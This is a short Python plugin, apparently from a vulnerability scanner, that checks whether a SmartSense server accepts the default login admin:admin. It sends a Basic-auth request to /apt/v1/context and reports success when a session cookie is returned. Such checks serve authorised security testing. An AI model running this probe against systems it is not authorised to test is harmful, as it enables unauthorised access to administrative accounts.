#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'SmartSense默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def base64Str(n):
  import base64
  base64str = str(base64.b64encode(n.encode('utf-8'))).lstrip("b'").rstrip("'")
  return base64str
def run(url,ua):
  ret = msg()
  admin = base64Str("admin:admin")
  headers = {
      'User-Agent': ua,
      'Authorization': f'Basic {admin}'
      }
  target = '/apt/v1/context'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'SUPPORTSESSIONID' in res.headers['set-cookie']:
      ret['huixian'] = 'admin:admin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret